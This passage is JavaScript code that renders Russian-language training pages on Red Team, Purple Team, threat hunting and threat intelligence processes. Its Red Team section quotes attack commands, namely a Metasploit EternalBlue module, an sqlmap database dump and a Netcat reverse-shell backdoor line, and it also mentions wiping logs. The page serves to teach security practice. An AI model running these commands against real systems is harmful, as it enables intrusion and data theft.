              <p>Red Team использует Burp Suite для анализа веб-приложений, выявляя уязвимости, такие как XSS, CSRF или неправильная аутентификация. Nessus сканирует сеть для обнаружения устаревших систем (например, Windows Server 2012 с CVE-2017-0144). Ручной анализ кода проводится с помощью инструментов, таких как SonarQube, для выявления логических ошибок или небезопасных API. Пример: Burp Suite обнаружил уязвимость XSS в форме логина (GET-параметр не экранирован), а Nessus выявил уязвимость EternalBlue на сервере 10.0.0.50.</p>
            </div>
          </div>
        </div>
        <div class="stego-method">
          <div class="stego-method-container" style="display: flex; align-items: stretch; gap: 20px; margin-bottom: 20px;">
            <div class="soc-interaction-diagram" style="flex: 0 0 250px; padding: 15px; border-radius: 8px; text-align: center; background-color: #05060a;">
              <h3>Эксплуатация</h3>
              <div style="display: flex; flex-direction: column; align-items: center; gap: 8px;">
                <div style="background-color: #d32f2f; padding: 8px; border-radius: 5px; width: 200px; white-space: normal; word-wrap: break-word;">
                  Запуск эксплойтов
                  <p style="font-size: 12px; margin: 5px 0 0; color: #fff;">Metasploit</p>
                </div>
                <div style="background-color: #f44336; padding: 8px; border-radius: 5px; width: 200px; white-space: normal; word-wrap: break-word;">
                  SQL-инъекции
                  <p style="font-size: 12px; margin: 5px 0 0; color: #fff;">SQLmap</p>
                </div>
                <div style="background-color: #ef5350; padding: 8px; border-radius: 5px; width: 200px; white-space: normal; word-wrap: break-word;">
                  Фишинг
                  <p style="font-size: 12px; margin: 5px 0 0; color: #fff;">SET</p>
                </div>
              </div>
            </div>
            <div style="flex: 0 0 1px; background-color: #444; height: auto;"></div>
            <div style="flex: 1; padding: 15px;">
              <h3>Эксплуатация</h3>
              <p>Red Team запускает эксплойты через Metasploit (например, модуль <code>exploit/windows/smb/ms17_010_eternalblue</code>) для получения доступа к уязвимым системам. SQLmap используется для выполнения SQL-инъекций (например, <code>sqlmap -u "http://company.com/login" --dbs</code>), извлекая данные из баз. Фишинговые атаки через SET отправляют поддельные письма, заманивая пользователей на вредоносные сайты. Пример: Metasploit успешно эксплуатировал EternalBlue, получив шелл на сервере 10.0.0.50, а SQLmap извлек таблицу users из базы данных.</p>
            </div>
          </div>
        </div>
        <div class="stego-method">
          <div class="stego-method-container" style="display: flex; align-items: stretch; gap: 20px; margin-bottom: 20px;">
            <div class="soc-interaction-diagram" style="flex: 0 0 250px; padding: 15px; border-radius: 8px; text-align: center; background-color: #05060a;">
              <h3>Эскалация привилегий</h3>
              <div style="display: flex; flex-direction: column; align-items: center; gap: 8px;">
                <div style="background-color: #d32f2f; padding: 8px; border-radius: 5px; width: 200px; white-space: normal; word-wrap: break-word;">
                  Уязвимости ядра
                  <p style="font-size: 12px; margin: 5px 0 0; color: #fff;">Dirty COW</p>
                </div>
                <div style="background-color: #f44336; padding: 8px; border-radius: 5px; width: 200px; white-space: normal; word-wrap: break-word;">
                  Слабые конфигурации
                  <p style="font-size: 12px; margin: 5px 0 0; color: #fff;">Mimikatz</p>
                </div>
                <div style="background-color: #ef5350; padding: 8px; border-radius: 5px; width: 200px; white-space: normal; word-wrap: break-word;">
                  Локальные эксплойты
                  <p style="font-size: 12px; margin: 5px 0 0; color: #fff;">PowerUp</p>
                </div>
              </div>
            </div>
            <div style="flex: 0 0 1px; background-color: #444; height: auto;"></div>
            <div style="flex: 1; padding: 15px;">
              <h3>Эскалация привилегий</h3>
              <p>Red Team использует уязвимости ядра, такие как Dirty COW (CVE-2016-5195), для получения root-доступа на Linux-системах. Mimikatz извлекает учетные данные из памяти Windows (например, NTLM-хэши) для атаки Pass-the-Hash. PowerUp (часть PowerSploit) выявляет слабые конфигурации, такие как некорректные права доступа. Пример: Mimikatz извлек учетные данные администратора, а PowerUp обнаружил службу с правами SYSTEM, позволяющую запустить командную оболочку с повышенными привилегиями.</p>
            </div>
          </div>
        </div>
        <div class="stego-method">
          <div class="stego-method-container" style="display: flex; align-items: stretch; gap: 20px; margin-bottom: 20px;">
            <div class="soc-interaction-diagram" style="flex: 0 0 250px; padding: 15px; border-radius: 8px; text-align: center; background-color: #05060a;">
              <h3>Пост-эксплуатация</h3>
              <div style="display: flex; flex-direction: column; align-items: center; gap: 8px;">
                <div style="background-color: #d32f2f; padding: 8px; border-radius: 5px; width: 200px; white-space: normal; word-wrap: break-word;">
                  Установка бэкдоров
                  <p style="font-size: 12px; margin: 5px 0 0; color: #fff;">Netcat</p>
                </div>
                <div style="background-color: #f44336; padding: 8px; border-radius: 5px; width: 200px; white-space: normal; word-wrap: break-word;">
                  Сбор данных
                  <p style="font-size: 12px; margin: 5px 0 0; color: #fff;">BloodHound</p>
                </div>
                <div style="background-color: #ef5350; padding: 8px; border-radius: 5px; width: 200px; white-space: normal; word-wrap: break-word;">
                  Очистка следов
                  <p style="font-size: 12px; margin: 5px 0 0; color: #fff;">CCleaner</p>
                </div>
              </div>
            </div>
            <div style="flex: 0 0 1px; background-color: #444; height: auto;"></div>
            <div style="flex: 1; padding: 15px;">
              <h3>Пост-эксплуатация</h3>
              <p>Red Team устанавливает бэкдоры с помощью Netcat для поддержания доступа (например, <code>nc -e /bin/sh 192.168.1.200 4444</code>). BloodHound анализирует Active Directory, выявляя пути для бокового перемещения (например, пользователи с доступом к серверам). Очистка следов проводится через CCleaner или скрипты, удаляющие логи событий. Пример: BloodHound обнаружил, что пользователь user1 имеет доступ к серверу БД, а Netcat обеспечил постоянное соединение для передачи данных.</p>
            </div>
          </div>
        </div>
        <h3>Взаимодействие с другими командами</h3>
        <ul>
          <li><strong>Blue Team:</strong> Передача отчетов об уязвимостях для устранения. Совместные упражнения через Purple Team.</li>
          <li><strong>Purple Team:</strong> Координация сценариев атак для проверки защиты.</li>
          <li><strong>Threat Intelligence:</strong> Получение TTP для моделирования атак (например, тактики APT28).</li>
          <li><strong>SOC:</strong> Тестирование дашбордов SOC через симуляцию атак.</li>
        </ul>
        <h3>Ключевые показатели эффективности (KPI)</h3>
        <ul>
          <li>Количество выявленных уязвимостей: >10 за тест.</li>
          <li>Время подготовки отчета: <48 часов.</li>
          <li>Процент успешных атак: <30% (указывает на сильную защиту).</li>
        </ul>
        <h3>Пример работы</h3>
        <p>Red Team провела тест: Nmap выявил открытый порт 3389, Burp Suite обнаружил XSS, Metasploit эксплуатировал EternalBlue, а Mimikatz получил учетные данные администратора. Отчет передан Blue Team, уязвимости устранены за 72 часа.</p>
        <p><strong>Положения:</strong></p>
        <ul>
          <li>Проведение тестов раз в квартал.</li>
          <li>Использование MITRE ATT&CK для сценариев.</li>
          <li>Согласование RoE за 7 дней до теста.</li>
          <li>Документирование всех действий в Jira.</li>
        </ul>
        <p><strong>Ответственность:</strong></p>
        <ul>
          <li><strong>Red Team:</strong> Проведение тестов, составление отчетов.</li>
          <li><strong>Blue Team:</strong> Реакция и устранение уязвимостей.</li>
          <li><strong>Руководство:</strong> Утверждение RoE, обеспечение ресурсов.</li>
        </ul>
        <p><strong>Порядок внедрения:</strong></p>
        <ul>
          <li>Согласование RoE (до 1 апреля 2025).</li>
          <li>Первый тест (до 15 апреля 2025).</li>
        </ul>
        <p><strong>Порядок пересмотра:</strong> Ежегодно или при изменении угроз.</p>
        <p><strong>Приложения:</strong> Шаблон RoE, чек-лист теста, отчет по уязвимостям.</p>
      </div>
    </div>
  `;
  contentArea.innerHTML = redTeamContent;
  document.querySelector('.back-btn').addEventListener('click', () => loadTeamsThreatIntelContent(contentArea));
}

function loadPurpleTeamContent(contentArea) {
  const purpleTeamContent = `
    <div class="teams-threat-container">
      <button class="back-btn">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
          <line x1="19" y1="12" x2="5" y2="12"></line>
          <polyline points="12 19 5 12 12 5"></polyline>
        </svg>
        Назад
      </button>
      <h1>Purple Team (Фиолетовая команда)</h1>
      <div class="lna-example">
        <h2>Теория работы Purple Team</h2>
        <p>Purple Team объединяет усилия Blue Team и Red Team для повышения эффективности защиты. Команда действует как координатор, обеспечивая обмен знаниями, оптимизацию процессов и обучение. Их работа основана на принципе "атакуй-защищай-анализируй-улучшай". Purple Team помогает выявить слабые места в защите, улучшить обнаружение и реагирование, а также внедрить новые подходы к безопасности на основе реальных сценариев атак.</p>
        <h3>Схема процессов и операций</h3>
        <div class="stego-method">
          <div class="stego-method-container" style="display: flex; align-items: stretch; gap: 20px; margin-bottom: 20px;">
            <div class="soc-interaction-diagram" style="flex: 0 0 250px; padding: 15px; border-radius: 8px; text-align: center; background-color: #05060a;">
              <h3>Планирование</h3>
              <div style="display: flex; flex-direction: column; align-items: center; gap: 8px;">
                <div style="background-color: #8e24aa; padding: 8px; border-radius: 5px; width: 200px; white-space: normal; word-wrap: break-word;">
                  Разработка сценариев
                  <p style="font-size: 12px; margin: 5px 0 0; color: #fff;">MITRE ATT&CK</p>
                </div>
                <div style="background-color: #ab47bc; padding: 8px; border-radius: 5px; width: 200px; white-space: normal; word-wrap: break-word;">
                  Выбор тактик
                  <p style="font-size: 12px; margin: 5px 0 0; color: #fff;">T1078</p>
                </div>
                <div style="background-color: #ce93d8; padding: 8px; border-radius: 5px; width: 200px; white-space: normal; word-wrap: break-word;">
                  Согласование
                  <p style="font-size: 12px; margin: 5px 0 0; color: #fff;">Команды</p>
                </div>
              </div>
            </div>
            <div style="flex: 0 0 1px; background-color: #444; height: auto;"></div>
            <div style="flex: 1; padding: 15px;">
              <h3>Планирование</h3>
              <p>На этапе планирования Purple Team разрабатывает сценарии атак, используя фреймворк MITRE ATT&CK. Например, выбирается техника T1078 (использование украденных учетных данных), чтобы протестировать защиту от компрометации аккаунтов. Определяются цели тестирования, такие как проверка обнаружения входов с аномальных IP. Сценарии согласовываются с Blue Team и Red Team, чтобы обе стороны понимали правила взаимодействия (RoE) и могли подготовиться к тесту. Также определяются метрики успеха, например, время обнаружения атаки (<15 минут).</p>
            </div>
          </div>
        </div>
        <div class="stego-method">
          <div class="stego-method-container" style="display: flex; align-items: stretch; gap: 20px; margin-bottom: 20px;">
            <div class="soc-interaction-diagram" style="flex: 0 0 250px; padding: 15px; border-radius: 8px; text-align: center; background-color: #05060a;">
              <h3>Тестирование</h3>
              <div style="display: flex; flex-direction: column; align-items: center; gap: 8px;">
                <div style="background-color: #8e24aa; padding: 8px; border-radius: 5px; width: 200px; white-space: normal; word-wrap: break-word;">
                  Атака Red Team
                  <p style="font-size: 12px; margin: 5px 0 0; color: #fff;">XSS, фишинг</p>
                </div>
                <div style="background-color: #ab47bc; padding: 8px; border-radius: 5px; width: 200px; white-space: normal; word-wrap: break-word;">
                  Реакция Blue Team
                  <p style="font-size: 12px; margin: 5px 0 0; color: #fff;">SIEM/WAF</p>
                </div>
                <div style="background-color: #ce93d8; padding: 8px; border-radius: 5px; width: 200px; white-space: normal; word-wrap: break-word;">
                  Мониторинг
                  <p style="font-size: 12px; margin: 5px 0 0; color: #fff;">Реальное время</p>
                </div>
              </div>
            </div>
            <div style="flex: 0 0 1px; background-color: #444; height: auto;"></div>
            <div style="flex: 1; padding: 15px;">
              <h3>Тестирование</h3>
              <p>Red Team выполняет атаку, например, запуск XSS через уязвимость в веб-приложении или фишинговую кампанию, чтобы сымитировать кражу учетных данных. Blue Team реагирует, используя SIEM для анализа логов (например, Splunk фиксирует рост числа ошибок 403) и WAF для блокировки вредоносных запросов. Purple Team в реальном времени мониторит процесс, фиксируя действия обеих команд. Используются дашборды для отслеживания событий, например, сколько времени понадобилось Blue Team на обнаружение атаки и какие сигнатуры сработали (или не сработали).</p>
            </div>
          </div>
        </div>
        <div class="stego-method">
          <div class="stego-method-container" style="display: flex; align-items: stretch; gap: 20px; margin-bottom: 20px;">
            <div class="soc-interaction-diagram" style="flex: 0 0 250px; padding: 15px; border-radius: 8px; text-align: center; background-color: #05060a;">
              <h3>Анализ</h3>
              <div style="display: flex; flex-direction: column; align-items: center; gap: 8px;">
                <div style="background-color: #8e24aa; padding: 8px; border-radius: 5px; width: 200px; white-space: normal; word-wrap: break-word;">
                  Сравнение логов
                  <p style="font-size: 12px; margin: 5px 0 0; color: #fff;">Атака/защита</p>
                </div>
                <div style="background-color: #ab47bc; padding: 8px; border-radius: 5px; width: 200px; white-space: normal; word-wrap: break-word;">
                  Выявление пробелов
                  <p style="font-size: 12px; margin: 5px 0 0; color: #fff;">WAF</p>
                </div>
                <div style="background-color: #ce93d8; padding: 8px; border-radius: 5px; width: 200px; white-space: normal; word-wrap: break-word;">
                  Анализ результатов
                  <p style="font-size: 12px; margin: 5px 0 0; color: #fff;">Эффективность</p>
                </div>
              </div>
            </div>
            <div style="flex: 0 0 1px; background-color: #444; height: auto;"></div>
            <div style="flex: 1; padding: 15px;">
              <h3>Анализ</h3>
              <p>На этапе анализа Purple Team сравнивает логи Red Team (например, отправка фишингового письма в 10:00) и Blue Team (обнаружение в 10:10). Выявляются пробелы: WAF не заблокировал XSS из-за отсутствия сигнатуры, а SIEM не сгенерировал алерт из-за низкого порога срабатывания. Проводится оценка эффективности защиты: процент обнаруженных атак (например, 60%), среднее время реакции (15 минут). Анализируются ложные срабатывания (false positives) и упущенные угрозы (false negatives), чтобы понять, где защита требует доработки.</p>
            </div>
          </div>
        </div>
        <div class="stego-method">
          <div class="stego-method-container" style="display: flex; align-items: stretch; gap: 20px; margin-bottom: 20px;">
            <div class="soc-interaction-diagram" style="flex: 0 0 250px; padding: 15px; border-radius: 8px; text-align: center; background-color: #05060a;">
              <h3>Оптимизация</h3>
              <div style="display: flex; flex-direction: column; align-items: center; gap: 8px;">
                <div style="background-color: #8e24aa; padding: 8px; border-radius: 5px; width: 200px; white-space: normal; word-wrap: break-word;">
                  Обновление правил
                  <p style="font-size: 12px; margin: 5px 0 0; color: #fff;">SIEM</p>
                </div>
                <div style="background-color: #ab47bc; padding: 8px; border-radius: 5px; width: 200px; white-space: normal; word-wrap: break-word;">
                  Настройка сигнатур
                  <p style="font-size: 12px; margin: 5px 0 0; color: #fff;">Snort</p>
                </div>
                <div style="background-color: #ce93d8; padding: 8px; border-radius: 5px; width: 200px; white-space: normal; word-wrap: break-word;">
                  Обучение команд
                  <p style="font-size: 12px; margin: 5px 0 0; color: #fff;">Новые техники</p>
                </div>
              </div>
            </div>
            <div style="flex: 0 0 1px; background-color: #444; height: auto;"></div>
            <div style="flex: 1; padding: 15px;">
              <h3>Оптимизация</h3>
              <p>На основе анализа Purple Team обновляет правила в SIEM, добавляя новые корреляционные правила (например, алерт на >100 попыток входа с одного IP за 5 минут). В Snort добавляются сигнатуры для выявления новых типов XSS-атак, обнаруженных во время теста. Проводится обучение Blue Team новым техникам защиты (например, настройка фильтров на email-шлюзе против фишинга) и Red Team новым методам атак (например, использование zero-day уязвимостей). Также внедряются автоматизированные тесты для регулярной проверки защиты.</p>
            </div>
          </div>
        </div>
        <div class="stego-method">
          <div class="stego-method-container" style="display: flex; align-items: stretch; gap: 20px; margin-bottom: 20px;">
            <div class="soc-interaction-diagram" style="flex: 0 0 250px; padding: 15px; border-radius: 8px; text-align: center; background-color: #05060a;">
              <h3>Документирование</h3>
              <div style="display: flex; flex-direction: column; align-items: center; gap: 8px;">
                <div style="background-color: #8e24aa; padding: 8px; border-radius: 5px; width: 200px; white-space: normal; word-wrap: break-word;">
                  Подробный отчет
                  <p style="font-size: 12px; margin: 5px 0 0; color: #fff;">Ход теста</p>
                </div>
                <div style="background-color: #ab47bc; padding: 8px; border-radius: 5px; width: 200px; white-space: normal; word-wrap: break-word;">
                  Выводы
                  <p style="font-size: 12px; margin: 5px 0 0; color: #fff;">Пробелы</p>
                </div>
                <div style="background-color: #ce93d8; padding: 8px; border-radius: 5px; width: 200px; white-space: normal; word-wrap: break-word;">
                  Рекомендации
                  <p style="font-size: 12px; margin: 5px 0 0; color: #fff;">Улучшения</p>
                </div>
              </div>
            </div>
            <div style="flex: 0 0 1px; background-color: #444; height: auto;"></div>
            <div style="flex: 1; padding: 15px;">
              <h3>Документирование</h3>
              <p>Purple Team составляет отчет, описывающий ход теста: какие атаки проводились (например, фишинг с использованием поддельного домена), как реагировала Blue Team (SIEM зафиксировал аномалию через 10 минут), какие пробелы выявлены (WAF пропустил XSS). В отчете указываются выводы: процент успешных атак (40%), время реакции (10-15 минут). Даются рекомендации: обновить правила WAF, добавить сигнатуры в Snort, провести тренинг по фишингу для сотрудников. Отчет передается Blue Team и Red Team для внедрения улучшений.</p>
            </div>
          </div>
        </div>
        <h3>Взаимодействие с другими командами</h3>
        <ul>
          <li><strong>Blue Team:</strong> Совместная работа для улучшения мониторинга и реагирования на основе тестов.</li>
          <li><strong>Red Team:</strong> Координация атак для тестирования защиты в контролируемых условиях.</li>
          <li><strong>Threat Intelligence:</strong> Использование данных о TTP для создания реалистичных сценариев.</li>
          <li><strong>SOC:</strong> Интеграция результатов тестов в дашборды SOC для улучшения мониторинга.</li>
        </ul>
        <h3>Ключевые показатели эффективности (KPI)</h3>
        <ul>
          <li>Время реакции Blue Team: <15 минут.</li>
          <li>Процент обнаруженных атак: >80%.</li>
          <li>Время подготовки отчета: <3 дней.</li>
        </ul>
        <h3>Пример работы</h3>
        <p>Purple Team организовала тест: Red Team провела фишинговую атаку, Blue Team обнаружила её через SIEM (Splunk) за 12 минут, но WAF пропустил XSS. Анализ показал, что сигнатуры WAF устарели. Purple Team обновила правила, добавила новые сигнатуры в Snort и провела тренинг для сотрудников. В следующем тесте процент обнаружения вырос с 60% до 85%.</p>
        <p><strong>Положения:</strong></p>
        <ul>
          <li>Проведение совместных упражнений раз в квартал.</li>
          <li>Использование MITRE ATT&CK для разработки сценариев.</li>
          <li>Мониторинг тестов в реальном времени через SIEM.</li>
          <li>Обновление правил и сигнатур после каждого теста.</li>
          <li>Обучение команд новым техникам атак и защиты.</li>
          <li>Документирование результатов в течение 3 дней.</li>
        </ul>
        <p><strong>Ответственность:</strong></p>
        <ul>
          <li><strong>Purple Team:</strong> Координация, анализ, документирование.</li>
          <li><strong>Blue Team:</strong> Реакция и внедрение улучшений.</li>
          <li><strong>Red Team:</strong> Проведение атак по сценарию.</li>
        </ul>
        <p><strong>Порядок внедрения:</strong></p>
        <ul>
          <li>Разработка сценариев (до 1 апреля 2025).</li>
          <li>Проведение первого теста (до 15 апреля 2025).</li>
        </ul>
        <p><strong>Порядок пересмотра:</strong> Ежегодно или при изменении процессов.</p>
        <p><strong>Приложения:</strong> Шаблон сценария теста, чек-лист анализа, пример отчета.</p>
      </div>
    </div>
  `;
  contentArea.innerHTML = purpleTeamContent;
  document.querySelector('.back-btn').addEventListener('click', () => loadTeamsThreatIntelContent(contentArea));
}

function loadThreatHuntingContent(contentArea) {
  const threatHuntingContent = `
    <div class="teams-threat-container">
      <button class="back-btn">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
          <line x1="19" y1="12" x2="5" y2="12"></line>
          <polyline points="12 19 5 12 12 5"></polyline>
        </svg>
        Назад
      </button>
      <h1>Threat Hunting (Охота за угрозами)</h1>
      <div class="lnd-example">
        <h2>Теория работы Threat Hunting</h2>
        <p>Threat Hunting — это проактивный поиск угроз, таких как APT, которые обходят стандартные защитные системы. Команда использует гипотезы, основанные на данных Threat Intelligence, логах и аномалиях, для выявления следов злоумышленников. Процесс требует глубокого анализа и творческого подхода.</p>
        <h3>Схема процессов Threat Hunting</h3>
        <div class="scheme-frame" style="border: 2px solid #000; border-radius: 8px; background-color: #05060a; padding: 20px; display: flex; justify-content: flex-start; align-items: stretch; gap: 40px; position: relative; overflow-x: auto; white-space: nowrap;">
          <div class="threat-hunting-diagram" style="flex: 0 0 auto; min-width: 250px; padding: 20px; border-radius: 8px; text-align: center; background-color: #05060a;">
            <h3>Threat Hunting</h3>
            <div style="display: flex; flex-direction: column; align-items: center; gap: 10px;">
              <div style="background-color: #8e24aa; padding: 10px; border-radius: 5px; width: 200px; white-space: normal; word-wrap: break-word;">
                Формирование гипотез
                <p style="font-size: 12px; margin: 5px 0 0; color: #fff;">На основе Threat Intelligence</p>
              </div>
              <div style="background-color: #ab47bc; padding: 10px; border-radius: 5px; width: 200px; white-space: normal; word-wrap: break-word;">
                Сбор данных
                <p style="font-size: 12px; margin: 5px 0 0; color: #fff;">Sysmon, Zeek, Volatility</p>
              </div>
              <div style="background-color: #ba68c8; padding: 10px; border-radius: 5px; width: 200px; white-space: normal; word-wrap: break-word;">
                Анализ
                <p style="font-size: 12px; margin: 5px 0 0; color: #fff;">YARA, Splunk ML</p>
              </div>
              <div style="background-color: #ce93d8; padding: 10px; border-radius: 5px; width: 200px; white-space: normal; word-wrap: break-word;">
                Подтверждение угрозы
                <p style="font-size: 12px; margin: 5px 0 0; color: #fff;">MISP, Kill Chain</p>
              </div>
              <div style="background-color: #e1bee7; padding: 10px; border-radius: 5px; width: 200px; white-space: normal; word-wrap: break-word; color: #000;">
                Документирование
                <p style="font-size: 12px; margin: 5px 0 0; color: #000;">Отчет для Blue Team</p>
              </div>
              <div style="background-color: #2a2f3b; padding: 10px; border-radius: 5px; margin-top: 10px; white-space: normal; word-wrap: break-word;">
                <span style="font-size: 16px;">Результат</span>
                <p style="font-size: 12px; margin: 5px 0 0; color: #fff;">Обнаруженная угроза</p>
              </div>
            </div>
          </div>
        </div>
        <h3>Взаимодействие с другими командами</h3>
        <ul>
          <li><strong>Blue Team:</strong> Передача данных для блокировки угроз и обновления SIEM.</li>
          <li><strong>Threat Intelligence:</strong> Получение IOC и TTP для формирования гипотез.</li>
          <li><strong>SOC:</strong> Совместный анализ логов для подтверждения угроз.</li>
          <li><strong>Purple Team:</strong> Тестирование гипотез в контролируемых сценариях.</li>
        </ul>
        <h3>Ключевые показатели эффективности (KPI)</h3>
        <ul>
          <li>Количество подтверждённых угроз: >5 в месяц.</li>
          <li>Время от гипотезы до подтверждения: <48 часов.</li>
          <li>Процент переданных данных Blue Team: 100%.</li>
        </ul>
        <h3>Пример работы</h3>
        <p>Threat Hunting обнаружила подозрительный процесс через Sysmon (cmd.exe с необычными аргументами). Анализ Zeek показал исходящий трафик на IP из отчета Threat Intelligence. YARA подтвердила хэш малвари. Угроза (RAT) была изолирована, Blue Team заблокировала C2-сервер, данные переданы для RCA.</p>
        <p><strong>Рекомендации:</strong></p>
        <ul>
          <li><strong>Формирование гипотез:</strong>
            <ul>
              <li>Анализируйте данные Threat Intelligence (отчеты VirusTotal).</li>
              <li>Ищите аномалии в логах SIEM (Splunk) раз в неделю.</li>
            </ul>
          </li>
          <li><strong>Сбор данных:</strong>
            <ul>
              <li>Настройте Sysmon для регистрации событий процессов.</li>
              <li>Используйте Zeek для анализа сетевого трафика (порт 47760).</li>
              <li>Собирайте дампы памяти через Volatility при подозрениях.</li>
            </ul>
          </li>
          <li><strong>Анализ:</strong>
            <ul>
              <li>Проверяйте сигнатуры с помощью YARA (ежедневное обновление).</li>
              <li>Анализируйте поведение процессов (PowerShell, cmd).</li>
              <li>Ищите подозрительные соединения (C2-серверы).</li>
            </ul>
          </li>
          <li><strong>Подтверждение угрозы:</strong>
            <ul>
              <li>Проверяйте IOC (хэши, IP) через MISP.</li>
              <li>Подтверждайте APT через корреляцию данных.</li>
            </ul>
          </li>
          <li><strong>Документирование:</strong>
            <ul>
              <li>Создавайте отчеты с указанием угрозы, доказательств, действий.</li>
              <li>Передавайте данные Blue Team в течение 24 часов.</li>
            </ul>
          </li>
        </ul>
        <p><strong>Ответственные лица:</strong> Аналитик ИБ Сидоров В.В., отдел SOC.</p>
        <p><strong>Контроль выполнения:</strong> Ежемесячный аудит отчетов.</p>
        <p><strong>Приложения:</strong> Чек-лист анализа логов, шаблон отчета, правила YARA.</p>
      </div>
    </div>
  `;
  contentArea.innerHTML = threatHuntingContent;
  document.querySelector('.back-btn').addEventListener('click', () => loadTeamsThreatIntelContent(contentArea));
}

function loadThreatIntelContent(contentArea) {
  const threatIntelContent = `
    <div class="teams-threat-container">
      <button class="back-btn">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
          <line x1="19" y1="12" x2="5" y2="12"></line>
          <polyline points="12 19 5 12 12 5"></polyline>
        </svg>
        Назад
      </button>
      <h1>Threat Intelligence (Анализ угроз)</h1>
      <div class="lnd-example">
        <h2>Теория работы Threat Intelligence</h2>
        <p>Threat Intelligence собирает, анализирует и распространяет данные об актуальных киберугрозах. Команда предоставляет контекст (кто, как, почему атакует), что позволяет прогнозировать угрозы и улучшать защиту. Процесс включает работу с открытыми и закрытыми источниками, интеграцию данных в системы защиты.</p>
        <h3>Схема процессов Threat Intelligence</h3>
        <div class="scheme-frame" style="border: 2px solid #000; border-radius: 8px; background-color: #05060a; padding: 20px; display: flex; justify-content: flex-start; align-items: stretch; gap: 40px; position: relative; overflow-x: auto; white-space: nowrap;">
          <div class="threat-intel-diagram" style="flex: 0 0 auto; min-width: 250px; padding: 20px; border-radius: 8px; text-align: center; background-color: #05060a;">
            <h3>Threat Intelligence</h3>
            <div style="display: flex; flex-direction: column; align-items: center; gap: 10px;">
              <div style="background-color: #8e24aa; padding: 10px; border-radius: 5px; width: 200px; white-space: normal; word-wrap: break-word;">
                Сбор данных
                <p style="font-size: 12px; margin: 5px 0 0; color: #fff;">Shodan, Pastebin, AlienVault</p>
              </div>
              <div style="background-color: #ab47bc; padding: 10px; border-radius: 5px; width: 200px; white-space: normal; word-wrap: break-word;">
                Анализ
                <p style="font-size: 12px; margin: 5px 0 0; color: #fff;">VirusTotal, MITRE ATT&CK</p>
              </div>
              <div style="background-color: #ba68c8; padding: 10px; border-radius: 5px; width: 200px; white-space: normal; word-wrap: break-word;">
                Обогащение
                <p style="font-size: 12px; margin: 5px 0 0; color: #fff;">Контекст (APT28)</p>
              </div>
              <div style="background-color: #ce93d8; padding: 10px; border-radius: 5px; width: 200px; white-space: normal; word-wrap: break-word;">
                Создание отчетов
                <p style="font-size: 12px; margin: 5px 0 0; color: #fff;">PDF, Confluence</p>
              </div>
              <div style="background-color: #e1bee7; padding: 10px; border-radius: 5px; width: 200px; white-space: normal; word-wrap: break-word; color: #000;">
                Интеграция
                <p style="font-size: 12px; margin: 5px 0 0; color: #000;">Splunk, Snort</p>
              </div>
              <div style="background-color: #2a2f3b; padding: 10px; border-radius: 5px; margin-top: 10px; white-space: normal; word-wrap: break-word;">
                <span style="font-size: 16px;">Результат</span>
                <p style="font-size: 12px; margin: 5px 0 0; color: #fff;">Обновленные правила</p>
              </div>
            </div>
          </div>
        </div>
        <h3>Взаимодействие с другими командами</h3>
        <ul>
          <li><strong>Blue Team:</strong> Передача IOC для настройки SIEM/IDS.</li>
          <li><strong>Threat Hunting:</strong> Предоставление данных для формирования гипотез.</li>
          <li><strong>Red Team:</strong> Поставка TTP для моделирования атак.</li>
          <li><strong>SOC:</strong> Интеграция отчетов для мониторинга в реальном времени.</li>
        </ul>
        <h3>Ключевые показатели эффективности (KPI)</h3>
        <ul>
          <li>Количество обработанных IOC: >100 в неделю.</li>
          <li>Время создания отчета: <24 часа для срочных угроз.</li>
          <li>Процент интегрированных правил: >90%.</li>
        </ul>
        <h3>Пример работы</h3>
        <p>Threat Intelligence обнаружила новую кампанию ransomware в даркнете (Recorded Future). Анализ показал хэш малвари и IP C2-сервера. Данные обогащены контекстом (группа REvil). Отчет передан SOC, правила добавлены в Splunk, атака предотвращена.</p>
        <p><strong>Рекомендации:</strong></p>
        <ul>
          <li><strong>Сбор данных:</strong>
            <ul>
              <li>Используйте OSINT (Shodan, Have I Been Pwned) ежедневно.</li>
              <li>Мониторьте даркнет через Recorded Future.</li>
              <li>Подписывайтесь на фиды IOC (AlienVault OTX).</li>
            </ul>
          </li>
          <li><strong>Анализ:</strong>
            <ul>
              <li>Изучайте хэши, IP, домены через VirusTotal.</li>
              <li>Анализируйте TTPs по MITRE ATT&CK.</li>
            </ul>
          </li>
          <li><strong>Обогащение:</strong>
            <ul>
              <li>Добавляйте контекст: атакующие группы, мотивы.</li>
              <li>Используйте MISP для корреляции данных.</li>
            </ul>
          </li>
          <li><strong>Создание отчетов:</strong>
            <ul>
              <li>Формируйте еженедельные отчеты для SOC.</li>
              <li>Указывайте IOC, TTPs, рекомендации.</li>
            </ul>
          </li>
          <li><strong>Интеграция:</strong>
            <ul>
              <li>Добавляйте правила в Splunk (порт 9997).</li>
              <li>Обновляйте сигнатуры Snort еженедельно.</li>
            </ul>
          </li>
        </ul>
        <p><strong>Ответственные лица:</strong> Аналитик ИБ Петров П.П., отдел SOC.</p>
        <p><strong>Контроль выполнения:</strong> Ежемесячная проверка отчетов.</p>
        <p><strong>Приложения:</strong> Список источников OSINT, шаблон отчета, интеграция MISP.</p>
      </div>
    </div>
  `;
  contentArea.innerHTML = threatIntelContent;
  document.querySelector('.back-btn').addEventListener('click', () => loadTeamsThreatIntelContent(contentArea));
}

function loadSocContent(contentArea) {
  const socContent = `
    <div class="teams-threat-container">
      <button class="back-btn">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
          <line x1="19" y1="12" x2="5" y2="12"></line>
          <polyline points="12 19 5 12 12 5"></polyline>
        </svg>
        Назад
      </button>
      <h1>SOC (Центр управления безопасностью)</h1>
      <div class="lna-example">
        <h2>Теория работы SOC</h2>
        <p>SOC — это централизованный узел управления безопасностью, обеспечивающий круглосуточный мониторинг, анализ и реагирование на инциденты. SOC делится на три уровня (L1, L2, L3), каждый из которых выполняет специфические функции, взаимодействуя между собой и с другими командами для защиты инфраструктуры.</p>
        
        <h2>Уровни SOC</h2>
        <div class="accordion">
          <!-- L1 Accordion -->
          <div class="accordion-item">
